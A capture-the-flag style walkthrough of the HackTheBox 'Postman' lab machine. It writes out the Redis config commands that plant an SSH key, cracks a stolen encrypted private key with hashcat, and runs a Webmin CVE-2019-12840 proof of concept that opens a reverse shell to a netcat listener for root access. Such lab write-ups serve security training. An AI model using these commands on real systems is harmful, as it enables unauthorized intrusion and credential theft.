---
title: "HTB - Postman Writeup"
date: 2026-10-30 18:48:00 +0700
categories: [HackTheBox, Machines]
tags: [linux, easy]
---
Postman is an easy difficulty Linux machine, which features a Redis server running without authentication. This service can be leveraged to write an SSH public key to the user&#039;s folder. An encrypted SSH private key is found, which can be cracked to gain user access. The user is found to have a login for an older version of Webmin. This is exploited through command injection to gain root privileges.

## P0
First of all, I use rustscan to find out all opened ports:<br>
```
└─$ rustscan -a 10.129.64.73 --ulimit 5000 --range 0-65535 --no-banner --scripts none
[~] Automatically increasing ulimit value to 5000.
Open 10.129.64.73:22
Open 10.129.64.73:80
Open 10.129.64.73:10000
Open 10.129.64.73:6379
10.129.64.73 -> [22,80,10000,6379]
```
Then I use nmap for getting details about them:<br>
```
└─$ nmap -O -sV -sC -Pn --disable-arp-ping --traceroute -p22,80,6379,10000 -oN 10.129.64.73_nmap 10.129.64.73
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-30 21:32 -0400
Nmap scan report for 10.129.64.73 (10.129.64.73)
Host is up (0.039s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   38.35 ms 10.10.14.1 (10.10.14.1)
2   38.55 ms 10.129.64.73 (10.129.64.73)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.60 seconds
```
## P1 & P2
The port **6379** looks strange with me, so I will focus to it firstly.<br>
Follow this [instruction](https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html#ssh) from https://hacktricks.wiki to insert a malicious public key to the target machine.
From that we can achive a initial shell:

1. Generate a ssh public-private key pair on your pc: ```ssh-keygen -t rsa```

2. Write the public key to a file : ```(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt```

3. Import the file into redis : ```cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key```

4. Save the public key to the authorized_keys file on redis server:
```
kali@kali:~# redis-cli -h 10.129.64.73
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
## P3 & P4 part 1
Good, we firstly have a initial shell:
```
└─$ ssh -i id_rsa redis@10.129.64.73
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Oct 31 01:04:04 2026 from 10.10.15.107
redis@Postman:~$
```
Next, I continue using my own tool to search any things in the target machine which can help me to privilege escalate. Actually, **Postman** machine is also vulnerable with **CVE-2026-31431** but now we just ignore it :). In addition to, I find out an interesting file:

![Upgrade_Notice.pdf](assets/image/htb/postman/2026-10-31_10-15.png){: w="700" }

This file looks like the private key which people usually use to ssh instead of using secret password. Deep dive in it more and more:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
.....
```
It has been encrypted by **DES-EDE3-CBC** algorithm. We need to decrypt it before we can use. What do we usually think to first ? Hashcat, that's right.<br>
Before using hashcat, we need to convert **id_rsa.bak** to the format which hashcat can understand. Here, we can use **ssh2john** to achive that purpose:
```
└─$ ssh2john id_rsa.bak        
id_rsa.bak:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364....
```
Now is mission of hashcat:
```
hashcat.exe -a 0 -m 22911 '$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a8110...' ..\own-wordlist\rockyou.txt
```
And luckily, we find the true password:
```
...644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63:computer2008
```
But what user will we ssh to :D, don't worry, just need to read **/etc/passwd** file to check:
```
redis@Postman:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
redis:x:107:114::/var/lib/redis:/bin/bash
```
And I find the user **Matt**, let's ssh with **Matt** user:
```
└─$ ssh -i id_rsa.bak Matt@10.129.64.73      
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa.bak': 
Connection closed by 10.129.64.73 port 22
```
What the....?? Maybe the sshd configuration does not allow **Matt** user to use ssh. But remember, a normal person usually use a same password for many other places. So maybe **computer2008** not only the secret password for **id_rsa.bak** but also the local password of user **Matt** in the target machine.
```
redis@Postman:~$ su Matt
Password: 
Matt@Postman:/var/lib/redis$ 
```
We find out the first flag:
```
Matt@Postman:~$ cat user.txt
```

Now I continue using my own tool as well as **linpeas.sh** to find out any interesting things but both fail. So again, whenever we stuck, back to recon and enumeration :D<br>
## P1 & P2
We have not touch to **port 10000**, let's do some basic enumeration on it. By nmap, we know that the service running on port 10000 is **MiniServ 1.910 (Webmin httpd)**. Try to search on Google (and some AI as well :D), I find out a promising CVE and its PoC on github. It's **CVE-2019-12840**

## P3 & P4 part 2
First of all, I will prepare a listener on my attack machine:
```
└─$ nc -nlvp 9002
```
Next, using the PoC to create a reverse shell to my listner:
```
└─$ python3 CVE-2019-12840.py -u https://10.129.64.73 -U Matt -P computer2008 -lhost 10.10.15.107 -lport 9002
```
And here is the result:
```
# whoami
root
# cd /root
# ls
redis-5.0.0
root.txt
# cat root.txt
```